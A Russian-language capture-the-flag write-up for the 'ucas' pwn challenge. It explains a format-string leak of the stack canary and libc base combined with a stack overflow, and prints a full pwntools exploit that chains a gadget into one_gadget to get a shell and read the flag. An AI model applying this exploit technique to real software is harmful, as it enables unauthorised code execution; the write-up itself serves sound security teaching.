# gaslightCTF — ucas (pwn)

## Категория
Pwn / Binary Exploitation (format string leak + stack smash → one_gadget)

## Дано
Хендаут `ucas` + `libc.so.6` + `ld-linux-x86-64.so.2`. Официальный
исходник (`ucas.c`, из репозитория `gaslightctf/challs-2026`):

```c
int main() {
    int chars = 0;
    char q1[1334], q2[1334], q3[1334];
    char name[16];

    printf("welcome to the ucas portal\n");
    printf("please enter your name: ");
    fgets(name, 16, stdin);
    printf("welcome, ");
    printf(name);                 // <-- format string bug

    printf("Why do you want to study this course or subject? ");
    fgets(q1, 4000-chars, stdin); chars += strlen(q1);

    printf("How have your qualifications and studies helped you to prepare for this course or subject? ");
    fgets(q2, 4000-chars, stdin); chars += strlen(q2);

    printf("What else have you done to prepare outside of education, and why are these experiences useful? ");
    fgets(q3, 4000-chars, stdin); chars += strlen(q3);

    if (chars > 4000) { printf("your essay is too long\n"); return 1; }

    printf("your essay is %d chars long\n", chars);
    if (chars % 8) { printf("you got no offers, have fun in clearing\n"); return 0; }
    printf("congrats, your essay was accepted! your offer is 10a*\n");
}
```

## Две независимые уязвимости

1. **Format string** в `printf(name)` — `name` читается `fgets(name, 16,
   stdin)` без санитайзинга и передаётся в `printf` напрямую, без формата.
   Даёт произвольное чтение стека через позиционные спецификаторы `%N$p`.
2. **Отсутствие единого контроля длины для каждого отдельного буфера.**
   `q1`, `q2`, `q3` объявлены как `char[1334]` каждый, но `fgets` их
   читает с лимитом `4000 - chars` (общий бюджет на все три вопроса
   суммарно), а не `sizeof(q3)`. Если оставить `q1` и `q2` пустыми, под
   `q3` остаётся почти весь бюджет в 4000 байт — при буфере всего 1334
   байт это даёт классический **stack buffer overflow** в `q3`.

Важно, что в стеке функции `main` буфер `q3` лежит так, что overflow из
него дотягивается прямо до сохранённого `canary` и saved return address —
т.е. обе уязвимости бьют в одну и ту же функцию `main`.

## План эксплуатации

1. Через `%513$p|%515$p` в поле `name` утекают **canary** (на стековом
   слоте `rbp-8`, что соответствует аргументу `%513$p` при фрейме main
   `rsp = rbp-0xfe0`) и **сохранённый адрес возврата** (`rbp+8`,
   аргумент `%515$p`) — последний лежит внутри `__libc_start_call_main`,
   что сразу даёт возможность вычислить базу libc:
   ```
   libc.address = leaked_return_addr - RET_OFF
   # RET_OFF = 0x2B285 (смещение этого адреса внутри __libc_start_call_main)
   ```
2. Оставляем `q1` и `q2` пустыми (просто `\n`), чтобы весь объём в 4000
   байт достался `q3`.
3. Собираем payload в `q3`:
   - `0x540 - 8` байт заполнения до сохранённого canary на стеке;
   - сам утёкший `canary` (чтобы canary-проверка прошла);
   - 8 нулевых байт на месте saved RBP;
   - ROP-цепочка поверх return address:
     - маленький гаджет `xor r9d, r9d; ret` (обнуляет `r9`, т.к.
       one_gadget требует `r9/r10` NULL-ish);
     - адрес **one_gadget** (`execve("/bin/sh", r9, r10)`);
     - добивка нулями под требования one_gadget constraints.
4. После возврата из `main` управление уходит на подготовленную цепочку
   → `execve("/bin/sh", ...)` → интерактивный шелл → `cat /flag`.

## Эксплойт (официальный `solve.py`)

```python
RET_OFF = 0x2B285      # main's return address внутри __libc_start_call_main
XOR_R9 = 0x2A987        # xor r9d, r9d ; ret
ONE_GADGET = 0xEF0A6    # execve("/bin/sh", r9, r10)

r.sendlineafter(b"name: ", b"%513$p|%515$p")
r.recvuntil(b"welcome, ")
canary, ret = [int(x, 16) for x in r.recvline().strip().split(b"|")]
libc.address = ret - RET_OFF
assert libc.address & 0xFFF == 0, "bad libc base"

chain = p64(libc.address + XOR_R9)
chain += p64(libc.address + ONE_GADGET)
chain += p64(0) * 32

payload = b"A" * (0x540 - 8) + p64(canary) + p64(0) + chain
assert b"\n" not in payload and len(payload) < 4000 - 2

r.sendlineafter(b"subject? ", b"")   # q1 — пусто
r.sendlineafter(b"subject? ", b"")   # q2 — пусто
r.sendlineafter(b"useful? ", payload)  # q3 — payload + overflow

r.sendline(b"cat /flag")
print(r.recvline())
```

Полный файл — `solve.py` рядом (официальный, из `gaslightctf/challs-2026`,
проверен автором задачи как решающий интендед-способом).

## Флаг

```
gaslightCTF{m4n1f3st1ng_e4sy_0ff3r5_f0r_ev3ry0n3}
```

Базовый статический шаблон из `chall.yaml`. Флаг у `ucas` **динамический**
(`dynamicFlag`, как у `good-enough`/`thirds`) — на реальном инстансе,
скорее всего, был с уникальным суффиксом; это значение — дефолт/шаблон.

## Выводы / чеклист для похожих заданий

1. Format string в одном месте программы часто используется не сам по
   себе, а как **инструмент утечки** (canary, адрес внутри libc) для
   эксплуатации совсем другой уязвимости дальше по коду.
2. Общий счётчик длины (`chars`) на несколько раздельных буферов — частый
   источник переполнения: достаточно "не потратить" бюджет на первые
   буферы, чтобы оставить избыточно много для последнего.
3. При canary + NX + отсутствии прямой утечки `win`/`system`-адреса —
   `one_gadget` поверх утёкшей базы libc остаётся самым быстрым путём к
   шеллу, если удаётся подогнать его rdi/rsi/rdx/r9/r10-констрейнты
   (здесь — обнулить `r9` отдельным гаджетом перед прыжком).
